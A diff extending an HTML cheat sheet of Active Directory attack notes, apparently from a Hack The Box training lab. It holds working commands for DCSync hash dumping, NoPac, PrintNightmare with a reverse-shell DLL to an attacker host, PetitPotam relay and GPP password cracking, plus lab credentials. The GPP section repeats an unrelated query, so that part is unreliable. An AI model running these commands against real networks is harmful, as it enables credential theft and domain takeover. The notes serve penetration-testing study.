@@ -74,6 +74,8 @@ queryuser RID  #Provides information about a specific user.</code></pre>
                 <ul>
                 <p> Utility to gather more information when a <b>user and password have been gathered</b></p>
                 <pre><code class="language-bash">bloodhound-python --dns-tcp -ns TARGET_IP -d DOMAIN -u 'USER' -p 'PASS' -c all</code></pre>
+                <p>From windows we use sharphound, load it into the box and run it. Then export files</p>
+                <pre><code class="language-bash">.\SharpHound.exe -c All --zipfilename bloodhound.zip</code></pre>   
                 
                 <p>Inside bloodhound panel it is important to check the following Pre-build Searches</p>
                 <ul>
@@ -105,10 +107,9 @@ rpcclient $> getdompwinfo
 ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
 net accounts #In case you have access to a computer
 PS C:\htb> import-module .\PowerView.ps1 & Get-DomainPolicy</code></pre>
-
-                 
-
-                
+               <h3>PASSWD_NOTREQD</h3>
+               <p>If this is set, the user is not subject to the current password policy length, meaning they could have a shorter password or no password at all</p>
+               <pre><code class="language-powershell">Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol</code></pre>     
             </ul>
                 
                 <h3></h3>
@@ -201,13 +202,23 @@ PS C:\htb> import-module .\PowerView.ps1 & Get-DomainPolicy</code></pre>
                         <li>GetChanges</li>
                         <li>GetChangesAll</li>
                     </ul>
+                    <p>Have in mind that there could be users which use Reversible Encryption Password Storage which means that the passwords are stored in RC4 encryption and the key to decrypt them is stored in the registry and can be extracted with admin rights or equivalent. You can check which are accounts are configured like this by using</p>
+                    <pre><code class="language-powershell">Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl</code></pre>
+                    <h4>Mimikatz</h4>
+                    <ul>
                     <p>Upload mimikatz to the victim server and execute the following command. In case you are in powershell use the " since the software begins to loop if not using it</p>
                     <p>Then crack the hash using hashcat. Hashcat codes can be found <a class="notion-link" href="https://hashcat.net/wiki/doku.php?id=example_hashes">Here</a></p>
-                    <pre><code class="language-powershell">.\mimikatz.exe "lsadump::dcsync /domain:DOMAIN.LOCAL /user:Administrator exit"</code></pre>
+                    <pre><code class="language-powershell">.\mimikatz
+lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:proxyagent</code></pre>
                     <p>Capture the has NTLM and usit to pass the hash in psexec</p>
-                    <pre><code class="language-bash">impacket-psexec -hashes :HASH DOMAIN.LOCAL/Administrator@TARGET_IP</code></pre>
-                    <p>or</p>
-                    <pre><code class="language-bash">wmiexec.py DOMAIN.local/USERNAME:'PASSWORD'@IP</code></pre>
+                    </ul>
+                    <h4>Secretsdump</h4>
+                    <ul>
+                    <p>You can upload to the DC but it's worth it to do it from outside</p>
+                    <pre><code class="language-bash">impacket-secretsdump -outputfile /home/kali/Desktop/result.txt  -just-dc INLANEFREIGHT/adunn@172.16.5.5</code></pre>
+                    <p>You can also perform listing for a single user</p>
+                    <pre><code class="language-bash">impacket-secretsdump -outputfile /home/kali/Desktop/Hackthebox/here.txt  -just-dc-user syncron INLANEFREIGHT/adunn@172.16.5.5</code></pre>
+                    </ul>
                 </ul>
 
                 
@@ -245,11 +256,14 @@ PS C:\htb> import-module .\PowerView.ps1 & Get-DomainPolicy</code></pre>
                     <h3>AS-REP Roasting Attack</h3>
                     <ul>
                         <p>Request hashes of AD accounts that have enabled the flag "Do not requiere Kerberos preauthentication". In that case an attacker can request a kerberos ticket without having the password for the user</p>
+                        <p>Remeber that using kerbrute you can perform the same action</p>
                         <pre><code class="language-bash"> impacket-GetNPUsers -no-pass -usersfile users.txt DOMAIN.LOCAL/</code></pre>
                         <p>Then crack the hash using hashcat. Hashcat codes can be found <a class="notion-link" href="https://hashcat.net/wiki/doku.php?id=example_hashes">Here</a></p>
                         <pre><code class="language-bash">hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt --force</code></pre>
                         <p>Show the hash</p>
-                        <pre><code class="language-bash">hashcat --show -m 18200 hash</code></pre>  
+                        <pre><code class="language-bash">hashcat --show -m 18200 hash</code></pre>
+                        <p>Command in powershell in case you have access to the DC. Remember to use powerview.ps1</p>
+                        <pre><code class="language-bash">Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl</code></pre>
                     </ul>
                     <h3>Kerberoasting Attack</h3>
                     <ul>
@@ -308,13 +322,141 @@ IT</code></pre>
 
                         <h3>Golden Ticket Attack 📀</h3>
                         <ul>
+                            <p>Under construction</p>
                         </ul>
 
                         <h3>Diamon Ticket Attack 🔷</h3>
                         <ul>
+                            <p>Under construction</p>
                         </ul>
                     </ul>
-                </ul>    
+
+                    <h3>Kerberos double hoping</h3>
+                    <ul>
+                        <p>The "Double Hop" problem often occurs when using WinRM/Powershell since the default authentication mechanism only provides a ticket to access a specific resource. This will likely cause issues when trying to perform lateral movement or even access file shares from the remote shell. In this situation, the user account being used has the rights to perform an action but is denied access</p>
+                        <p>There are some workarrounds we can use in order to fix this</p>
+                        <h4>Workaround #1: PSCredential Object</h4>
+                        <ul>
+                            <p>Setup variables to store the password for the user you control</p>
+                            <pre><code class="language-bash">$SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)</code></pre>
+                            <p>Execute the command pointing to the domain</p>    
+                            <pre><code class="language-bash">get-domainuser -spn -credential $Cred | select samaccountname</code></pre>
+                            
+                        </ul>
+                        <h4>Workaround #2: Register PSSession Configuration</h4>
+                        <p>Establish a winrm sesion to remote host</p>
+                        <pre><code class="language-bash">Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm</code></pre>
+                        <p>Import powerview </p>
+                        <pre><code class="language-bash">Import-Module .\PowerView.ps1</code></pre>
+                        <p>Register a new session configuration using the Register-PSSessionConfiguration </p>
+                        <pre><code class="language-bash">Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm</code></pre>
+                        <p>Restart winrm service</p>
+                        <pre><code class="language-bash">Restart-Service WinRM</code></pre>
+                        <p>Establish again a winrm session to remote host and you are done</p>
+                        <pre><code class="language-bash">Enter-PSSession -ConfigurationName backupadmsess -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm</code></pre>
+                    </ul>
+
+                    <h3>Kerberos Constrained Delegation</h3>
+                    <ul>
+                        <p>In case you found an account that has kerberos constrained delegation enabled it is possible to impersonate any domain user. Use the following command to check for users with that propery</p>
+                        <pre><code class="language-powershell">Get-NetUser -TrustedToAuth</code></pre>
+                        <p>Now check the field <b>msds-allowedtodelegateto</b> in case you see the DC you are likely to keep forward</p>
+                        <p>Compromise that user and login as it, then use rubeus to request a delegation TGT</p>
+                        <pre><code class="language-powershell">Rubeus.exe tgtdeleg /nowrap</code></pre>
+                        <p>Use the ticket obtained to impersonate the user</p>
+                        <pre><code class="language-powershell">Rubeus.exe s4u /ticket:BASE64_TICKET_HERE /impersonateuser:administrator /domain:offense.local /msdsspn:cifs/dc01.offense.local /dc:dc01.offense.local /ptt</code></pre>
+                        <p>Then you'll see two tickets, the second one is the important, with that ticket imported automatically you can access the dc directly by typing <b>dir \\dc01.inlanefreight.local\C$</b> or use secretsdump.py obviously exporting the ticket previously</p>
+                        <pre><code class="language-powershell">secretsdump.py -k -no-pass INLANEFREIGHT/administrator@ACADEMY-EA-DC01.inlanefreight.local</code></pre>
+                    </ul>
+                </ul> 
+                
+                <h2 id="NoPac">NoPac</h2>
+                <p>This exploit path takes advantage of being able to change the SamAccountName of a computer account to that of a Domain Controller. By default, authenticated users can add up to ten computers to a domain. When doing so, we change the name of the new host to match a Domain Controller's SamAccountName. Once done, we must request Kerberos tickets causing the service to issue us tickets under the DC's name instead of the new name. When a TGS is requested, it will issue the ticket with the closest matching name</p>
+                <ul>
+                    <h3>Steps to perform</h3>
+                    <p>First we need to scan the target in order to se if its vulnerable. Use the scanner.py provided in the repo</p>
+                    <pre><code class="language-bash">python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5</code></pre>
+                    <p>In case we see the following it is likely to be vulnerable. Have in mind that in the Machine Quota is 0 we won't be able to use this attack</p>
+                    <pre><code class="language-bash">[*] Current ms-DS-MachineAccountQuota = 10
+[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484
+[*] Got TGT from 172.16.5.5. Ticket size 663</code></pre>
+                    <p>Now exploiting part:</p>
+                    <pre><code class="language-bash">python3 noPac.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap</code></pre>    
+                    <p>Now that the exploit succeed we can try with the following. Obiously you need a domain user and it's credentials. Then you'll get NTLM hash of admin account</p>
+                    <pre><code class="language-bash">python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator</code></pre>
+                    <p>Then you'll get a shell but you won't be able to get out of system32 folder. Even though the ticket from the administrator will be in our power so we can use it to connect</p>
+                    <p><b>Remember to add the name of the host to th /etc/hosts in this case (ACADEMY-EA-DC01.inlanefreight.local) </b></p>
+                    <pre><code class="language-bash">mv administrator_ACADEMY-EA-DC01.inlanefreight.local.ccache /tmp/admin.ccache</code></pre>
+                    <pre><code class="language-bash">export KRB5CCNAME=/tmp/admin.ccache</code></pre>
+                    <pre><code class="language-bash">psexec.py -k -no-pass INLANEFREIGHT.LOCAL/Administrator@ACADEMY-EA-DC01.inlanefreight.local</code></pre>
+                    
+                <h2 id="PrintNightmare">PrintNightmare</h2>
+                <ul>
+                    <p>A vulnerability found in the Print Spooler service that runs on all Windows operating systems, Clone the repo from <a class="notion-link" href="https://github.com/cube0x0/CVE-2021-1675">CVE-2021-1675</a></p>
+                    <p>Check if the server has the <b>Print System Asynchronous Protocol and Print System Remote Protocol exposed</b></p>  
+                    <pre><code class="language-bash">rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'</code></pre>
+                    <p>Exploitation</p>
+                    <p>First generate the payload</p>
+                    <pre><code class="language-bash">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll</code></pre>
+                    <p>Then open a smb server to host that payload</p>
+                    <pre><code class="language-bash">impacket-smbserver share . -smb2support</code></pre>
+                    <p>Then use exploit multi handler from msfconsole to capture the shell</p>
+                    <pre><code class="language-bash">use exploit/multi/handler/ lhost 172.16.5.225 lport 8080</code></pre>
+                    <p>Finally exploit it using the following command</p>
+                    <pre><code class="language-bash">python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\share\backupscript.dll'</code></pre>
+                </ul>
+
+                <h2 id="PetitPotam">PetitPotam</h2>
+                <ul>
+                    <p>It is an NTLM authentication coercion technique that forces a Windows machine (often a Domain Controller) to authenticate to an attacker-controlled system without needing credentials. In summary the attack goes: The attacker remotely calls (EfsRpcOpenFileRaw) then the victim system attempts to access a UNC path: (\\ATTACKER\share\file) which Windows automatically authenticates using NTLM to finally allow the attacker top capture or relays that authentication</p>
+                    <p>Turn on petit potam providing you attack address first and then the target adress</p>
+                    <pre><code class="language-bash">python3 PetitPotam.py 172.16.5.225 172.16.5.5</code></pre>
+                    <p>Then start ntlmrelay.py and provide the following credentials</p>
+                    <pre><code class="language-bash">sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController</code></pre>
+                    <ul>
+                        <p>In case you are doing this combined with ligolo you must use two listeners for the following ports (80,445) and the NTLM relay command must be</p>
+                        <pre><code class="language-bash">impacket-ntlmrelayx -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController --http-port 80</code></pre>
+                    </ul>
+                    <p>This will generate a certificate in base64. Copy into a file and decode it</p>
+                    <pre><code class="language-bash">cat certb64 | base64 -d > crt.pfx</code></pre>
+                    <p>Now request a tgt with certificate used</p>
+                    <pre><code class="language-bash">sudo python3 gettgtpkinit.py inlanefreight.local/ACADEMY-EA-DC01$ -cert-pfx /home/htb-student/crt.pfx out.ccache</code></pre>
+                    <p>Export the ticket</p>
+                    <pre><code class="language-bash"> export KRB5CCNAME=/tmp/out.ccache</code></pre>
+                    <p>Use the ticket to dump hashes</p>
+                    <pre><code class="language-bash">sudo secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</code></pre>
+                </ul>
+
+                <h2 id="Group Policy Preferences (GPP) Passwords">Group Policy Preferences (GPP) Passwords</h2>
+                <ul>
+                    <p>When a new GPP is created, an .xml file is created in the SYSVOL share. This xml will contain a credential for a user account. This is currently patched but you may find a share where .xml files are still in the SYSVOL directory.</p>
+                    <p>Find users with GPP</p>
+                    <pre><code class="language-bash">Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol</code></pre>
+                    <p>To crack the password you need</p>
+                    <pre><code class="language-bash">gpp-decrypt encrypted_password</code></pre>
+                    <p>You can automate this process by using</p>
+                    <pre><code class="language-bash">netexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_password
+netexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin</code></pre>
+                </ul>
+
+
+                    
+
+                    
+
+                    
+                    
+                    
+                
+
+ 
+                    
+
+                   
+
+
+                </ul>
             </ul>        
         </div>
     </div>
